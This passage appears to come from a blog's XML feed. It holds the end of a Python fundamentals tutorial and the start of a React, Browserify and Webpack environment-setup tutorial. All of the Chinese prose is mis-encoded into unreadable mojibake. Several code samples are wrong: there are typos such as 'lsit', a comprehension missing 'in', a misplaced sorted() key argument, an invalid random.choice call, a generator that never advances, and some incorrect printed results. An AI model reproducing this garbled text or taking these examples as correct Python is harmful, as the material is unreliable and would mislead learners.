 dd_list = defaultdict(list)dd_list[1].append(2) # &#123; 1: [2] &#125;dd_list = defaultdict(list)dd_list[&#x27;Mark&#x27;][&#x27;City&#x27;] = &#x27;Bay Area&#x27; # &#123; &#x27;Mark&#x27;: &#123; &#x27;City&#x27;: &#x27;Bay Area&#x27;&#125; &#125;dd_list = defaultdict(lambda: [0, 0])dd_pair[2][1] = 1

 Counterï¼šå¯ä»¥æŠŠä¸€ç³»åˆ—å€¼è½‰æˆé¡ä¼¼ defaultdict(int) çš„æ±è¥¿ï¼Œè£¡é¢æ¯å€‹å€¼éƒ½å°æ‡‰åˆ°ç›¸æ‡‰çš„æ•¸é‡ï¼Œä¸»è¦æœƒä½¿ç”¨ä¾†å»ºç«‹ç›´æ–¹åœ– 
 from collections import Counterc = Counter([0, 1, 2, 0]) # &#123; 0: 2, 1: 1, 2: 1 &#125; word_counts = Counter(document)

 æ¯å€‹ Counter å¯¦ä¾‹éƒ½æœ‰å€‹ most_common çš„æ–¹æ³•
 for word, count in word_counts.most_common(10):	print(word, count)

é›†åˆï¼ˆSetï¼‰ é›†åˆé¡ä¼¼æ•¸å­¸ä¸­çš„é›†åˆï¼Œè£¡é¢åŒ…å«ä¸é‡è¤‡çš„å…ƒç´ å€¼
 s = set()s.add(1) # &#123; 1 &#125;s.add(2) # &#123; 1, 2 &#125;s.add(2) # &#123; 1, 2 &#125;len(s) # 2 1 in s # True

 é›†åˆåœ¨åˆ¤æ–·å…ƒç´ æ˜¯å¦å­˜åœ¨çš„æ•ˆç‡ç›¸å°è¼ƒå¥½ï¼Œæ­¤å¤–ï¼Œå°æ–¼åˆ¤æ–·ä¸é‡è¤‡å€¼ä¹Ÿå¾ˆæ–¹ä¾¿
 list_item = [1, 2, 3, 1, 2, 3]set_item = set(list_item) # &#123;1, 2, 3&#125;lsit(set_item) # [1, 2, 3]

è§£æå¼åˆ—è¡¨ï¼ˆcomprehensive listï¼‰åœ¨ Python æˆ‘å€‘é€šå¸¸æœƒéœ€è¦æŠŠæŸå€‹ list è½‰æ›æˆå¦å¤–ä¸€å€‹ listï¼Œæ¯”å¦‚åªæŒ‘é¸å…¶ä¸­å¹¾å€‹å…ƒç´ ï¼Œæˆ–æ˜¯å°æœŸä¸­æŸäº›å…ƒç´ é€²è¡Œè½‰æ›ã€‚
even_numbers = [x for x in range(5) if x % 2 == 0]squares = [x for x in range(5) if x % 2 == 0]even_squares = [x * x for x even_numbers]# ä¸æ“ä½œå€¼çš„è©±zeros = [0 for _ in even_numbers] # å’Œ even_numbers é•·åº¦ä¸€æ¨£å€¼éƒ½ç‚º 0 çš„ä¸²åˆ—

å»ºç«‹ set å’Œ dict
square_dict = &#123; x : x * x for x in range(5) &#125;square_set = &#123; x * x for x in [1, -1] &#125; # &#123; 1 &#125;pairs = [(x, y) for x in range(10) for y in range(10)] # (0, 0), (0, 1)p = [(x, y) for x in range(3) for y in range( x + 1, 10)]

å‡½å¼å‡½å¼ï¼ˆfunctionï¼‰æ˜¯é‡è¤‡ä½¿ç”¨çš„ç¨‹å¼å€å¡Šï¼Œæœ‰è¼¸å…¥è¼¸å‡ºã€‚åœ¨ Python ä¸­æˆ‘å€‘æœƒä½¿ç”¨ def ä¾†å®šç¾©å‡½å¼ï¼š
def sum(x, y):	return x + y 

Python çš„å‡½æ•¸å’Œ JavaScript ä¸€æ¨£ï¼Œå±¬æ–¼ä¸€ç´šå‡½å¼ï¼ˆfirst-classï¼‰ã€‚æˆ‘å€‘å¯ä»¥å°‡å‡½æ•¸æŒ‡å®šçµ¦æŸå€‹è®Šæ•¸ï¼Œç„¶å¾ŒæŠŠå®ƒå‚³çµ¦æŸå€‹å‡½æ•¸ä¸­ï¼Œå°±åƒæ˜¯å¹³å¸¸æŠŠåƒæ•¸å‚³å…¥å‡½å¼ä¸€æ¨£ã€‚
def apply_f(fun):	return fun(3, 2)def sum(x, y):	return x + y sum_fun = sumnum = apply_f(sum)print(num) // 5

åŒ¿åå‡½æ•¸ä½¿ç”¨æ–¹å¼ï¼ˆé¡ä¼¼ ES6 arrow function ç°¡åŒ–å¯«æ³•ï¼Œå‰é¢æ˜¯åƒæ•¸å¾Œé¢æ˜¯æ“ä½œï¼‰ï¼š
y = apply_f(lambda x: x + 4)

å‡½å¼åƒæ•¸é è¨­å€¼ï¼š
def my_print(message=&quot;default&quot;):	print(message)my_print(&quot;hello python&quot;)my_print() 

args èˆ‡ kwargsè‹¥æˆ‘å€‘å¸Œæœ›å‡½å¼å¯ä»¥æ¥å—ä»»æ„åƒæ•¸ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ argsï¼ˆç”±ç„¡åç¨±åƒæ•¸çµ„æˆçš„å…ƒçµ„ï¼‰ å’Œ kwargsï¼ˆç”±ç„¡åç¨±åƒæ•¸çµ„æˆçš„å­—å…¸ï¼‰ï¼š
def magic(*args, **kwargs):	print(&#x27;unnamed args:&#x27;, args)	print(&#x27;keywords args:&#x27;, kwargs)magic(1, 2, key=&#x27;word&#x27;, key2=&#x27;word2&#x27;) # unnamed args: (1, 2)# keywords args: &#123;&#x27;key&#x27;: &#x27;word&#x27;, &#x27;key2&#x27;: &#x27;word2&#x27;&#125;

å¯ä»¥ç”¨ä¾†å”åŠ©å»ºç«‹ä»¥å‡½å¼ç•¶åšåƒæ•¸çš„é«˜éšå‡½å¼ï¼š
def double(f):	def g(*args, **kwargs):		return 2 * f(*args, **kwargs)	return gdef f2(x, y):	return x + yg = doubler_correct(f2)print(g(1, 2))

å¸¸è¦‹å…§å»ºå‡½å¼é™¤äº†è‡ªå·±å¯ä»¥å»ºç«‹å‡½å¼å¤–ï¼ŒPython æœ¬èº«ä¹Ÿæä¾›è¨±å¤šå¥½ç”¨çš„å…§å»ºå‡½å¼ï¼š

allï¼šåˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ ç‚ºçœŸ
  all([True, 1, &#123; 3 &#125;]) # Trueall([True, 1, &#123; &#125;]) # Falseall([]) # Trueï¼Œæ²’æœ‰å…ƒç´ ç‚ºå‡

anyï¼šåˆ—è¡¨ä¸­åªè¦æœ‰ä»»ä½•å…ƒç´ ç‚ºçœŸ
  any([True, 1, &#123;&#125;]) # Trueany([]) # Falseï¼Œæ²’æœ‰å…ƒç´ ç‚ºçœŸ

enumerateï¼šåˆ—èˆ‰
  æˆ‘å€‘å¸¸éœ€è¦åè¦†å–å¾—åˆ—è¡¨ä¸­æ¯å€‹å…ƒç´ åŠå…¶ç´¢å¼•å€¼
  # choice 1for i in range(len(documents)):	document = documents[i]	do_something(i, document)# choice 2i = 0for document in documents:	do_something(i, document)	i += 1

  ä½¿ç”¨ enumerateï¼š
  for i, document in enumerate(documents):	do_something(i, document)# åƒ…éœ€è¦ indexfor i, _ in enumerate(documents): do_something(i)

zipï¼šåˆä½µå°‡å¤šå€‹ list åˆä½µæˆ tuple of list
  list1 = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]list2 = [1, 2, 3]zip(list1, list2) # [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2)]zip(*[(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]) == zip((&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)) # [(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;), (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;)]

  # * å¯ä»¥åƒæ•¸æ‹†åˆ†def add(a, b): return a + badd(1, 3) # 4add([1, 3]) # TypeErroradd(*[1, 3]) # 4

rangeï¼šå–å¾—ä¸€åºåˆ—
  range(0, 10) # 0, 1, 2, ... 9

randomï¼šç”Ÿæˆéš¨æ©Ÿæ•¸å­—
  import randomrandoms = [random.random() for _ in range(4)] # ç”Ÿæˆé•·åº¦ç‚º 4 å…§æ¶µå€¼ç‚º 0 - 1 ä¸å« 0 çš„ list

  äº‹å¯¦ä¸Šï¼Œrandom ç”¢ç”Ÿçš„æ˜¯å½éš¨æ©Ÿæ•¸å­—ï¼Œé€é seed è¨­å®šå¯ä»¥å–å¾—åŒæ¨£å€¼
  import randomrandom.seed(10) # æŠŠ seed è¨­ç‚º 10print(random.random()) # 0.5714025946899135random.seed(10) # æŠŠ seed è¨­ç‚º 10print(random.random()) # 0.5714025946899135 

  éš¨æ©Ÿç”¢ç”Ÿç¯„åœå…§æ•¸å­—ï¼š
  random.randrange(10)random.randrange(3, 6)

  é‡å°åˆ—è¡¨éš¨æ©Ÿæ’åˆ—ï¼š
  num = range(10)random.shuffle(num)

  random.choice([&#x27;Mark&#x27;, &#x27;Bob&#x27;, &#x27;Jack&#x27;])

  éš¨æ©Ÿå–æ¨£ä¸æ”¾å›ï¼š
  nums = range(10)random.sample(nums, 3)

  éš¨æ©Ÿå–æ¨£æ”¾å›ï¼š
  nums = range(10)random.choice(nums, 3)

sortï¼šé‡å° list é€²è¡Œæ’åºï¼ˆç”±å°åˆ°å¤§ï¼‰ï¼Œæœƒæ”¹è®ŠåŸä¾†çš„ listã€‚sorted ä¸æœƒæ”¹è®ŠåŸä¾† list
  x = [4, 1, 2, 3]y = sorted(x) # [1, 2, 3, 4] ä¸æœƒæ”¹è®Šåˆ° xx.sort() # x è®Šæˆ [1, 2, 3, 4]

  è‹¥æƒ³æ”¹æˆç”±å¤§åˆ°å°æ’åº
  x = sorted([-4, 1, -2, 3, key=abs, reverse=True]) # [-4, 3, -3, 2] çµ•å°å€¼ç”±å¤§åˆ°å°

  è‹¥æ˜¯åœ¨ key æŒ‡å®šä¸€å€‹å‡½æ•¸ï¼Œå°±æœƒç”¨é€™å€‹å‡½æ•¸çµæœå»åšæ’åº
  wc = sorted(word_counts.items(), key=lambda (word, count): count, reverse=True) # é‡å°å–®å­—æ•¸é‡å¤šåˆ°å°æ’åº

partialï¼šä½¿ç”¨å‡½å¼å·¥å…·å‰µå»ºå¦ä¸€å€‹å‡½å¼
  from functools import partialdef exp(base, power):	return base ** powertwo_to_the = partial(exp, 2)print_two_the(3)

mapï¼š
  def multiply(x, y):	return x * ymap(multiply, [1, 2], [1, 2]) # [1, 4]

filterï¼š
  def is_even(x):	return x % 2 == 0filter(is_even, [2, 5, 6]) # [2, 6]

reduceï¼š
  def multiply(x, y):	return x * yreduce(multiply, [1, 2, 3]) # 1 * 2 * 3

æ§åˆ¶æµç¨‹
ifâ€¦elifâ€¦else
 if 1 &gt; 2:	message = &#x27;if onlt 1 were greater than two&#x27;elif 1 &gt; 3: 	message = &#x27;elif == else if&#x27;else:	message = &#x27;else&#x27;

 ä¸‰å…ƒé‹ç®—å­ï¼š
 parity = &#x27;even&#x27; if x % 2 == 0 else &#x27;odd&#x27;

forâ€¦in 
 è¼ƒè¤‡é›œæƒ…æ³æˆ‘å€‘æœƒæ­é… continue å’Œ break ä½¿ç”¨ï¼š
 for x in range(10): # 0...9 ä¸å« 10	if x == 3:		continue	if x == 5:		break	print(x)

while
 x = 0while x &lt; 10:	print(&#x27;x is less than 10&#x27;)	x += 1

ç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰èˆ‡è¿­ä»£æ“ä½œäº‹å¯¦ä¸Šï¼Œlist æœ‰å€‹å•é¡Œå°±æ˜¯å¾ˆå®¹æ˜“è®Šå¾—å¾ˆå¤§ã€‚ä¾‹å¦‚ï¼šrange(1000000) å°±æœƒè£½é€ å‡ºä¸€å€‹åŒ…å«ä¸€ç™¾è¬çš„å…ƒç´ çš„ listã€‚è‹¥æ˜¯æƒ³è¦ä½¿ç”¨å…¶ä¸­å¹¾å€‹å…ƒç´ ï¼Œæ•ˆèƒ½å°±æœƒè®Šå¾—å¾ˆå·®ã€‚æ­¤æ™‚ä½¿ç”¨ç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰å°±æ˜¯ä¸€å€‹æ¯æ¬¡åªç”Ÿæˆæ‰€éœ€æ•¸å€¼çš„ä¸€ç¨® lazy ä½œæ³•ã€‚
ä½¿ç”¨å‡½å¼å’Œ yield
def lazy_range(n):	i = 0	while i &lt; n:		yield i		i += i

for i in lazy_range(10):	do_something(i)

æˆ–æ˜¯åœ¨å°æ‹¬è™Ÿä½¿ç”¨é‹ç®—è§£æå¼
lazy_evens_below_20 = (i for i in lazy_range(20) if i % 2 == 0)å¦å¤–ï¼Œæ¯å€‹ dict éƒ½æœ‰ä¸€å€‹å«åš items() çš„æ–¹æ³•iteritems() # å¯ä»¥ä¸€æ¬¡ç”Ÿæˆä¸€å€‹éµå€¼å°

è£é£¾å™¨ï¼ˆdecoratorï¼‰è£é£¾å™¨æœ¬èº«æ˜¯ä¸€å€‹å‡½å¼ï¼Œä¸»è¦æ˜¯å€ŸåŠ©é–‰åŒ…åŠ›é‡ç”¢ç”Ÿä¸€å€‹å¯ä»¥ä¿®é£¾å‡½å¼çš„å‡½å¼ï¼š
@print_fun(title=&#x27;title:&#x27;)def add(*tup):	return sum(tup)# ä»¥ä¸‹å…©è€…ç›¸åŒadd(1, 2, 3, 4)add = print_fun(title=&#x27;title:&#x27;)(add)# è£é£¾å™¨æ’°å¯«def print_fun(title):	def decorator(func):		def modified_func(*args, **kwargs):			result = func(*args, ** kwargs)			print(title, result)		return modified_func	return decorator

æ­£è¦è¡¨é”å¼èˆ‡è¨±å¤šç¨‹å¼èªè¨€ä¸€æ¨£ï¼ŒPython åŒæ¨£æä¾›æ­£è¦è¡¨é”å¼çš„ç”¨æ³•ï¼Œå¯ä»¥æ–¹ä¾¿æ“·å–æ–‡å­—ã€‚
import reprint.all([re.match(&#x27;a&#x27;, &#x27;cat&#x27;),re.search(&#x27;a&#x27;, &#x27;cat&#x27;)])

ç‰©ä»¶å°å‘ç¨‹å¼è¨­è¨ˆï¼ˆOOPï¼‰Python ä¹Ÿæ˜¯ç‰©ä»¶å°å‘ç¨‹å¼èªè¨€ï¼š
class Set:	def __init__(self, values=None):		# å»ºæ§‹å‡½æ•¸		s1 = Set()		s2 = Set([1, 2, 3])		self.dict = &#123;&#125; 		if values is not None:			for value in values:				self.add(value)	def __repr__(self):		return &quot;Set&quot; + str(self.dict.keys())	def add(self, value):		self.dict[value] = True	def contains(self, value):		return value in self.dict	def remove(self, value):		del self.dict[value]# ä½¿ç”¨ç‰©ä»¶s = Set([1, 2, 3])s.add(4)print(s.contains(4))

ä¾‹å¤–ç‹€æ³è‹¥æ˜¯ç¨‹å¼å‡ºç¾éŒ¯èª¤çš„è©±æœƒé€å‡º exceptionï¼Œè‹¥ä¸å¦¥å–„è™•ç†çš„è©±ç¨‹å¼å¾ˆæœ‰å¯èƒ½æœƒæ›æ‰ï¼Œåœ¨ Python ä¸­ä¾‹å¤–è™•ç†å¯ä»¥ä½¿ç”¨ tryâ€¦exceptï¼š
try:	print(1/0)except ZeroDivisionError:  	print(&#x27;cannot divide by zero&#x27;)

ç¸½çµæœ¬æ–‡å¿«é€Ÿä»‹ç´¹äº† Python çš„åŸºç¤æ¦‚å¿µï¼Œç•¶è®€è€…å­¸æœƒäº† Python å¾Œï¼Œäº‹å¯¦ä¸Šå¯ä»¥å˜—è©¦ä½¿ç”¨ Python é–‹ç™¼ä¸åŒçš„ç¶²è·¯æ‡‰ç”¨ç¨‹å¼æˆ–æ˜¯è³‡æ–™ç§‘å­¸ï¼Œç”šè‡³æ˜¯è‡ªç„¶èªè¨€è™•ç†çš„æ‡‰ç”¨ã€‚
å»¶ä¼¸é–±è®€
15 Essential Python Interview Questions
8 Essential Python Interview Questions*
Python Interview Questions
What are good Python interview questions?
Top 40 Python Interview Questions &amp; Answers 
Top Python Interview Questions And Answers
Python Interview Questions
12æ­¥æ•™ä½ ç†è§£Pythonè£…é¥°å™¨

ï¼ˆimage via fedoramagazineï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python, Django, MVC, Web, MTV, Web Backend, Web Framework, æ•™å­¸, Flask, æ¡†æ¶</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€çœ‹å°±æ‡‚çš„ React é–‹ç™¼ç’°å¢ƒå»ºç½®èˆ‡ Webpack å…¥é–€æ•™å­¸</title>
    <url>/2016/07/30/react-dev-enviroment-webpack-browserify/</url>
    <content><![CDATA[
å‰è¨€ä¿—è©±èªªå·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚å¯«ç¨‹å¼ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œæ­å»ºå¥½é–‹ç™¼ç’°å¢ƒå¾Œå¯ä»¥è®“è‡ªå·±åœ¨å¾ŒçºŒé–‹ç™¼ä¸Šæ›´åŠ é †åˆ©ã€‚å› æ­¤æœ¬ç¯‡æ¥ä¸‹ä¾†å°‡è¨è«– React é–‹ç™¼ç’°å¢ƒçš„ä¸‰ç¨®ä¸»è¦æ–¹å¼ï¼šCDN-basedã€browserify å’Œ webpackï¼ˆé€™é‚Šæˆ‘å€‘å°±å…ˆä¸è¨è«– TypeScript çš„é–‹ç™¼æ–¹å¼ï¼‰ï¼Œè®“è®€è€…é–±è®€å®Œæœ¬ç« å¾Œå¯ä»¥é–‹å§‹ React é–‹ç™¼ä¹‹æ—…ï¼
JavaScript æ¨¡çµ„åŒ–éš¨è‘—ç¶²ç«™é–‹ç™¼çš„è¤‡é›œåº¦ææ˜‡ï¼Œè¨±å¤šç¾ä»£åŒ–çš„ç¶²ç«™å·²ä¸æ˜¯å–®ç´”çš„ç¶²ç«™è€Œå·²ï¼Œæ›´åƒæ˜¯å€‹å¯Œæœ‰äº’å‹•æ€§çš„ç¶²é æ‡‰ç”¨ç¨‹å¼ï¼ˆWeb Appï¼‰ã€‚ç‚ºäº†æ‡‰ä»˜ç¾ä»£åŒ–ç¶²é æ‡‰ç”¨ç¨‹å¼é–‹ç™¼çš„éœ€æ±‚ï¼Œè§£æ±ºä¸€äº›åƒæ˜¯å…¨åŸŸè®Šæ•¸æ±¡æŸ“ã€ä½ç¶­è­·æ€§ç­‰å•é¡Œï¼ŒJavaScript åœ¨æ¨¡çµ„åŒ–ä¸Šä¹Ÿæœ‰é•·è¶³çš„ç™¼å±•ã€‚éå»ä¸€æ®µæ™‚é–“è®€è€…å€‘æˆ–è¨±è½éåƒæ˜¯ Webpackã€Browserifyã€module bundlersã€AMDã€CommonJSã€UMDã€ES6 Module ç­‰æœ‰é—œ JavaScript æ¨¡çµ„åŒ–é–‹ç™¼çš„å°ˆæœ‰åè©æˆ–å·¥å…·ã€‚è‹¥æ˜¯è®€è€…å°æ–¼ JavaScript æ¨¡çµ„åŒ–é–‹ç™¼å°šä¸ç†Ÿæ‚‰çš„è©±æ¨è–¦å¯ä»¥åƒè€ƒé€™ç¯‡æ–‡ç«  å’Œ é€™ç¯‡æ–‡ç« ï¼Œç•¶ä½œå…¥é–€ã€‚ç­†è€…ä¹‹å¾Œä¹Ÿæœƒæœ‰ç›¸é—œæ–‡ç« é‡å° JavaScript æ¨¡çµ„åŒ–è­°é¡Œåšè¨è«–ã€‚å› ç‚ºé™æ–¼ç¯‡å¹…ï¼Œé€™é‚Šæˆ‘å€‘æœƒå°ˆæ³¨åœ¨ React é–‹ç™¼ç’°å¢ƒçš„ä¸‰ç¨®ä¸»è¦æ–¹å¼ä»‹ç´¹ã€‚
ç¸½çš„ä¾†èªªï¼Œä½¿ç”¨æ¨¡çµ„åŒ–é–‹ç™¼ JavaScript æ‡‰ç”¨ç¨‹å¼ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç¨®å¥½è™•ï¼š

ææ˜‡ç¶­è­·æ€§ï¼ˆMaintainabilityï¼‰
å‘½åç©ºé–“ï¼ˆNamespacingï¼‰
æä¾›å¯é‡ç”¨æ€§ï¼ˆReusabilityï¼‰

è€Œåœ¨ React æ‡‰ç”¨ç¨‹å¼é–‹ç™¼ä¸Šæ›´æ¨è–¦ä½¿ç”¨åƒæ˜¯ Webpack é€™æ¨£çš„ module bundlers ä¾†çµ„ç¹”æˆ‘å€‘çš„æ‡‰ç”¨ç¨‹å¼ï¼Œä½†å°æ–¼ä¸€èˆ¬è®€è€…ä¾†èªª Webpack å¼·å¤§è€Œå®Œæ•´çš„åŠŸèƒ½ç›¸å°è¤‡é›œã€‚ç‚ºäº†è®“è®€è€…å…ˆç†Ÿæ‚‰ React æ ¸å¿ƒè§€å¿µï¼ˆæˆ‘å€‘å‡è¨­è®€è€…å·²ç¶“æœ‰ä½¿ç”¨ JavaScript æˆ– jQuery çš„åŸºæœ¬ç¶“é©—ï¼‰ï¼Œæˆ‘å€‘å°‡å¾ä½¿ç”¨ CDN å¼•å…¥ &lt;script&gt; çš„æ–¹å¼é–‹å§‹ä»‹ç´¹ï¼š
CDN-basedä½¿ç”¨ CDN-based çš„é–‹ç™¼æ–¹å¼ç¼ºé»æ˜¯è¼ƒé›£ç¶­è­·æˆ‘å€‘çš„ç¨‹å¼ç¢¼ï¼ˆç•¶å¼•å…¥å‡½å¼åº«ä¸€å¤šå°±æœƒæœ‰å¾ˆå¤š &lt;script/&gt;ï¼‰ä¸”æœƒå®¹æ˜“é‡åˆ°ç‰ˆæœ¬ç›¸å®¹æ€§å•é¡Œï¼Œä¸å¤ªé©åˆé–‹ç™¼å¤§å‹æ‡‰ç”¨ç¨‹å¼ï¼Œä½†å› ç‚ºç°¡å–®æ˜“æ‡‚ï¼Œé©åˆæ•™å­¸ä¸Šä½¿ç”¨ã€‚
ä»¥ä¸‹æ˜¯ React å®˜æ–¹é¦–é çš„ç¯„ä¾‹ï¼Œä»¥ä¸‹ä½¿ç”¨ React v15.2.1ï¼š0. ç†è§£ React æ˜¯ Component å°å‘çš„æ‡‰ç”¨ç¨‹å¼è¨­è¨ˆ

å¼•å…¥ react.jsã€react-dom.jsï¼ˆreact 0.14 å¾Œå°‡ react-dom å¾ react æ ¸å¿ƒåˆ†é›¢ï¼Œæ›´ç¬¦åˆ react è·¨å¹³å°æŠ½è±¡åŒ–çš„å®šä½ï¼‰ä»¥åŠ babel-core-browser ç‰ˆ scriptï¼ˆå¯ä»¥æƒ³æˆ babel æ˜¯ç¿»è­¯æ©Ÿï¼Œç¿»è­¯ç€è¦½å™¨çœ‹ä¸æ‡‚çš„ JSX æˆ– ES6+ èªæ³•æˆç‚ºç€è¦½å™¨çœ‹çš„æ‡‚å¾—çš„ JavaScriptï¼‰ã€‚äº‹å¯¦ä¸Šï¼ŒJSX ä¸¦éä¸€ç¨®å…¨æ–°çš„èªè¨€ï¼Œè€Œæ˜¯ä¸€ç¨®èªæ³•ç³–ï¼ˆSyntatic Sugarï¼‰ï¼Œä¸€ç¨®èªæ³•é¡ä¼¼ XML çš„ ECMAScript èªæ³•æ“´å……ã€‚è‹¥è®€è€…ä¸ç†Ÿæ‚‰çš„è©±å¯ä»¥åƒè€ƒç­†è€…å¦ä¸€ç¯‡æ–‡ç« ï¼šä¸€çœ‹å°±æ‡‚çš„ JSX ç°¡æ˜å…¥é–€æ•™å­¸æŒ‡å—
åœ¨ &lt;body&gt; æ’°å¯« React Component è¦æ’å…¥ï¼ˆmountï¼‰çš„åœ°æ–¹ï¼š&lt;div id=&quot;example&quot;&gt;&lt;/div&gt;
é€é babel é€²è¡Œèªè¨€ç¿»è­¯ React JSX èªæ³•ï¼Œbabel æœƒå°‡å…¶è½‰ç‚ºç€è¦½å™¨çœ‹çš„æ‡‚å¾— JavaScriptã€‚å…¶ä»£è¡¨æ„ç¾©æ˜¯ï¼šReactDOM.render(æ¬² render çš„ Component æˆ– HTML å…ƒç´ , æ¬²æ’å…¥çš„ä½ç½®)ã€‚æ‰€ä»¥æˆ‘å€‘å¯ä»¥åœ¨ç€è¦½å™¨ä¸Šæ‰“é–‹æˆ‘å€‘çš„ hello.htmlï¼Œå°±å¯ä»¥çœ‹åˆ° Hello, world! ã€‚Thatâ€™s itï¼Œæˆ‘å€‘ç¬¬ä¸€å€‹ React æ‡‰ç”¨ç¨‹å¼å°±ç®—å®Œæˆäº†ï¼

hello.html&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;title&gt;Hello React!&lt;/title&gt;    &lt;!-- ä»¥ä¸‹å¼•å…¥ react.js, react-dom.jsï¼ˆreact 0.14 å¾Œå°‡ react-dom å¾ react æ ¸å¿ƒåˆ†é›¢ï¼Œæ›´ç¬¦åˆ react è·¨å¹³å°æŠ½è±¡åŒ–çš„å®šä½ï¼‰ä»¥åŠ babel-core browser ç‰ˆ --&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/15.2.1/react.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/15.2.1/react-dom.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/babel-core/5.8.34/browser.min.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;!-- é€™é‚Šçš„ id=&quot;example&quot; çš„ &lt;div&gt; ç‚º React Component è¦æ’å…¥çš„åœ°æ–¹ --&gt;    &lt;div id=&quot;example&quot;&gt;&lt;/div&gt;    &lt;!-- ä»¥ä¸‹å°±æ˜¯åŒ…åœ¨ babelï¼ˆé€éé€²è¡Œèªè¨€ç¿»è­¯ï¼‰ä¸­çš„ React JSX èªæ³•ï¼Œbabel æœƒå°‡å…¶è½‰ç‚ºç€è¦½å™¨çœ‹çš„æ‡‚å¾— JavaScript --&gt;    &lt;script type=&quot;text/babel&quot;&gt;      ReactDOM.render(        &lt;h1&gt;Hello, world!&lt;/h1&gt;,        document.getElementById(&#x27;example&#x27;)      );    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;

åœ¨ç€è¦½å™¨ç€è¦½æœ€å¾Œæˆæœï¼š

Browserify + Gulp + Babelifyåœ¨é€²å…¥ç¬¬äºŒç¨®æ–¹æ³•å‰ï¼Œé¦–å…ˆå…ˆä»‹ç´¹ä¸€ä¸‹æœƒç”¨åˆ° Browserifyã€Gulpã€Babelify ä¸‰ç¨®å‰ç«¯é–‹ç™¼å¸¸æœƒç”¨åˆ°çš„å·¥å…·ï¼š
Browserify

å¦‚åŒå®˜ç¶²ä¸Šèªªæ˜çš„ï¼šBrowserify lets you require(&#39;modules&#39;) in the browser by bundling up all of your dependencies. ï¼ŒBrowserify æ˜¯ä¸€å€‹å¯ä»¥è®“ä½ åœ¨ç€è¦½å™¨ç«¯ä¹Ÿèƒ½ä½¿ç”¨åƒ Node ç”¨çš„ CommonJS è¦ç¯„ä¸€æ¨£ï¼Œç”¨è¼¸å‡ºï¼ˆexportï¼‰å’Œå¼•ç”¨ï¼ˆrequireï¼‰ä¾†ç®¡ç†æ¨¡çµ„ã€‚æ­¤å¤–ï¼Œä¹Ÿèƒ½ä½¿ç”¨è¨±å¤šåœ¨ NPM ä¸­çš„æ¨¡çµ„

Gulp

Gulp æ˜¯ä¸€å€‹å‰ç«¯ä»»å‹™å·¥å…·è‡ªå‹•åŒ–ç®¡ç†å·¥å…·ã€‚éš¨è‘—å‰ç«¯å·¥ç¨‹çš„ç™¼å±•ï¼ˆTask Runnerï¼‰ï¼Œæˆ‘å€‘åœ¨é–‹ç™¼å‰ç«¯æ‡‰ç”¨ç¨‹å¼æ™‚æœ‰è¨±å¤šå·¥ä½œæ˜¯å¿…é ˆé‡è¤‡é€²è¡Œï¼Œä¾‹å¦‚ï¼šæ‰“åŒ…æ–‡ä»¶ã€uglifyã€å°‡ LESS è½‰è­¯æˆä¸€èˆ¬çš„ CSS çš„æª”æ¡ˆï¼Œè½‰è­¯ ES6 èªæ³•ç­‰å·¥ä½œã€‚è‹¥æ˜¯ä½¿ç”¨ä¸€èˆ¬æ‰‹å‹•çš„æ–¹å¼ï¼Œå¾€å¾€æœƒé€ æˆæ•ˆç‡çš„ä½ä¸‹ï¼Œæ‰€ä»¥é€éåƒæ˜¯ Gruntã€Gulp é€™é¡çš„ Task Runner ä¸ä½†å¯ä»¥ææ˜‡æ•ˆç‡ï¼Œä¹Ÿå¯ä»¥æ›´æ–¹ä¾¿ç®¡ç†é€™äº›ä»»å‹™ã€‚ç”±æ–¼ Gulp æ˜¯é€é pipeline æ–¹å¼ä¾†è™•ç†æª”æ¡ˆï¼Œåœ¨ä½¿ç”¨ä¸Šæ¯”èµ· Grunt çš„æ–¹å¼ç›´è§€è¨±å¤šï¼Œæ‰€ä»¥é€™é‚Šæˆ‘å€‘ä¸»è¦è¨è«–çš„æ˜¯ Gulp

Babelify

Babelify æ˜¯ä¸€å€‹ä½¿ç”¨ Browserify é€²è¡Œ Babel è½‰æ›çš„å¤–æ›ï¼Œä½ å¯ä»¥æƒ³æˆæ˜¯ä¸€å€‹ç¿»è­¯æ©Ÿï¼Œå¯ä»¥å°‡ React ä¸­çš„ JSX æˆ– ES6 èªæ³•è½‰æˆç€è¦½å™¨ç›¸å®¹çš„ ES5 èªæ³•

åˆæ­¥äº†è§£äº†ä¸‰ç¨®å·¥å…·çš„æ¦‚å¿µå¾Œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°±é–‹å§‹æˆ‘å€‘çš„ç’°å¢ƒè¨­ç½®ï¼š

